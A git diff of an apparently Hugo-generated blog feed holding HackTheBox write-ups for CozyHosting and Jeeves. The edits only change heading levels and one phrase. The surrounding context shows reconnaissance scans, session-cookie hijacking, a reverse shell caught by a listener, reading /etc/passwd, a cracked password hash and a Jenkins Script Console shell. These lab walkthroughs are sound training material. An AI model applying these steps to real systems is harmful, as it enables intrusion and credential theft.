@@ -16,10 +16,10 @@
       
       <guid>http://localhost:1313/posts/cozyhosting/</guid>
       <description><![CDATA[<p><img src="/img/cozyhosting/cozyhosting.png" alt="CozyHosting"></p>
-<h3 id="description">Description</h3>
+<h2 id="description">Description</h2>
 <p>CozyHosting is an easy-rated challenge on HackTheBox. The foothold involves finding an exposed user session and exploitating an authenticated
 command injection vulnerability. After gaining a shell, we find hardcoded user credentials and exploit sudo permissions to escalate to root.</p>
-<h3 id="recon">Recon</h3>
+<h2 id="recon">Recon</h2>
 <p>Starting off with a nmap scan, we find 2 open TCP ports: 22 and 80.</p>
 <pre tabindex="0"><code># Nmap 7.94SVN scan initiated Sun Jan 26 14:49:51 2025 as: nmap -p- -A -v -oN /tmp/nmap.scan -T4 10.10.11.230
 Increasing send delay for 10.10.11.230 from 0 to 5 due to 599 out of 1496 dropped probes since last increase.
@@ -98,7 +98,7 @@ Target: http://cozyhosting.htb/
 Task Completed
 </code></pre><p>Visiting <code>/actuator/sessions</code> reveals a user session for <code>kanderson</code>.</p>
 <p><img src="/img/cozyhosting/sessions.png" alt="exposed Actuator sessions"></p>
-<h3 id="foothold">Foothold</h3>
+<h2 id="foothold">Foothold</h2>
 <p>We can take over <code>kanderson</code>&rsquo;s session by adding his JSESSIONID cookie to our browser and refreshing the page.</p>
 <p><img src="/img/cozyhosting/hijacking.png" alt="Replacing cookie"></p>
 <p>If not automatically redirected to <code>http://cozyhosting.htb/admin</code>, heading there should now reveal the Admin dashboard.</p>
@@ -125,7 +125,7 @@ listening on [any] 21 ...
 connect to [10.10.14.60] from (UNKNOWN) [10.10.11.230] 35240
 whoami
 app
-</code></pre><h3 id="privilege-escalation">Privilege Escalation</h3>
+</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
 <p>After stabilizing the shell, I started enumeration. There is a <code>cloudhosting-0.0.1.jar</code> file in the directory we land in. We can transfer this file
 to our local machine for further analysis.</p>
 <pre tabindex="0"><code>app@cozyhosting:/app$ ls -al
@@ -226,7 +226,7 @@ cozyhosting=#
 <pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
 └─$ hashcat -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -m 3200 --show
 $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
-</code></pre><p>Looking at the users, <code>root</code>, <code>josh</code>, and <code>postgres</code> seem worth looking into.</p>
+</code></pre><p>Looking at system users, <code>root</code>, <code>josh</code>, and <code>postgres</code> seem worth looking into.</p>
 <pre tabindex="0"><code>app@cozyhosting:/app$ cat /etc/passwd | grep -v nologin | grep -v false
 root:x:0:0:root:/root:/bin/bash
 sync:x:4:65534:sync:/bin:/bin/sync
@@ -266,9 +266,9 @@ root
       
       <guid>http://localhost:1313/posts/jeeves/</guid>
       <description><![CDATA[<p><img src="/img/jeeves/jeeves.png#center" alt="Jeeves"></p>
-<h3 id="description">Description</h3>
+<h2 id="description">Description</h2>
 <p>Jeeves is a medium-difficult machine on HackTheBox. There is a Jenkins dashboard where unauthenticated users can access the Script Console and get a reverse shell. After the initial foothold, gaining access to a KeePass database file reveals Administrator&rsquo;s NTLM hash.</p>
-<h3 id="recon">Recon</h3>
+<h2 id="recon">Recon</h2>
 <p>Starting off with a nmap scan:</p>
 <pre tabindex="0"><code># Nmap 7.94SVN scan initiated Mon Nov 11 13:02:01 2024 as: nmap -p- -A -v -T4 -oN /tmp/nmap.scan 10.10.10.63
 adjust_timeouts2: packet supposedly had rtt of -211723 microseconds.  Ignoring time.
@@ -392,7 +392,7 @@ by Ben &#34;epi&#34; Risher 🤓                 ver: 2.11.0
 <p><img src="/img/jeeves/jenkins_web.png" alt="Jenkins Server"></p>
 <p>Jenkins is an open source CI/CD server. In this case, anonymous users have full access to the dashboard. This happens when the Jenkins authorization strategy is set to Unsecured. After compromising the machine, I confirmed this was the case by checking <code>config.xml</code> and finding the unsecured authorization strategy in use.</p>
 <p><code>&lt;authorizationStrategy class=&quot;hudson.security.AuthorizationStrategy$Unsecured&quot;/&gt;</code></p>
-<h3 id="foothold">Foothold</h3>
+<h2 id="foothold">Foothold</h2>
 <p>We can leverage our permissions to access the Script Console by going to &ldquo;Mange Jenkins&rdquo; &gt; &ldquo;Script Console&rdquo;.</p>
 <p><img src="/img/jeeves/script_console.png" alt="Jenkins Script Console"></p>
 <p>Here we can execute a Groovy code to get a reverse shell. I got mine from revshells, but it is worth noting that Java shells also work because Groovy is a superset of Java and also runs on the JVM.</p>
@@ -404,7 +404,7 @@ Microsoft Windows [Version 10.0.10586]
 (c) 2015 Microsoft Corporation. All rights reserved.
 
 C:\Users\Administrator\.jenkins&gt;
-</code></pre><h3 id="privilege-escalation">Privilege Escalation</h3>
+</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
 <p>I always go for low-hanging fruit first when escalating privileges. Looking at my user privilege, I saw that we have the SEImpersonatePrivilege. We can potentially impersonate a high-privileged user.</p>
 <pre tabindex="0"><code>C:\Temp&gt;whoami /priv
 whoami /priv
